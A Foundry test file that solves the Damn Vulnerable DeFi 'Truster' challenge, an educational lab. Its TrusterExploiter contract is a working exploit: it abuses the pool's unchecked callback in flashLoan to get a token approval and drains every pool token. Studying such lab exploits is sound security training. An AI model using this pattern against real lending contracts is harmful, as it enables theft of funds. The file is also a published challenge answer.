// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";


contract TrusterExploiter {
    TrusterLenderPool pool;
    DamnValuableToken token;
    address recovery;
    uint256 immutable TOKENS_IN_POOL;

    constructor(address _pool, address _token, address _recovery, uint256 _TOKENS_IN_POOL) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
        recovery = _recovery;
        TOKENS_IN_POOL = _TOKENS_IN_POOL;
    }

    function attack() external {
        // need to approve the transfer of the tokens from the pool to the attacker contract
        bytes memory data = abi.encodeCall(
            token.approve,
            (address(this), TOKENS_IN_POOL)
        );

        // we can borrow 0 tokens, just need to call the function on the token contract
        pool.flashLoan(0, address(this), address(token), data);

        token.transferFrom(address(pool), address(this), token.balanceOf(address(pool)));

        token.transfer(recovery, TOKENS_IN_POOL);

    }
}

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {

        // we deploy the exploiter contract and call the attack function
        TrusterExploiter exploiter = new TrusterExploiter(
            address(pool),
            address(token),
            recovery,
            TOKENS_IN_POOL
        );

        exploiter.attack();


    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery),TOKENS_IN_POOL,"Not enough tokens in recovery account");
    }
}
